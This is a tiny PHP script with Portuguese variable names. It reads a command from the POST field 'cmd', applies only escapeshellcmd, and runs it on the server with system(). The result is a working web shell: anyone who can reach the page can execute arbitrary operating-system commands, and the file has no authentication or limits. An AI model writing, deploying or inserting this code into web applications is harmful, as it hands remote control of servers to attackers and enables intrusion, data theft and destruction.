<?php

    $cmd = escapeshellcmd($_POST['cmd']);

    $comando = system($cmd, $retorno);


